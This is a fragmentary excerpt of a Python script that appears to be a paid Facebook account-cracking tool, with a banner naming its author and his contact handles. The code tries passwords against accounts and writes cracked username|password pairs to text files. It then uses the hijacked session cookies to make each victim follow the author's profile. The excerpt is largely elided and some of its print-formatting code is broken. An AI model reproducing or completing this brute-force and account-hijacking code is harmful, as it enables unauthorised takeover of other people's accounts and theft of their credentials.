...
logo =                                          """   
\033[1;36m __        ______    __      
\033[1;36m|  |      /  __  \  |  |     
\033[1;36m|  |     |  |  |  | |  |     
\033[1;36m|  |     |  |  |  | |  |     
\033[1;36m|  `----.|  `--'  | |  `----.
\033[1;36m|_______| \______/  |_______|  TOOL
\x1b
         
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97RehanAli  \x1b[1;95mTOOL:\x1b[1;97mPAID    \x1b[1;91mV:\x1b[1;97m1.0.1

         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923498410573
          \x1b[1;92m FACEBOOK:  \x1b[1;95m/RehanAli786
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mREHAN_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mREHAN_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [LOL-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('REHAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [LOL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('REHAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=RehanTalpur786', cookies={'cookie': coki}).text, 'html.parser')
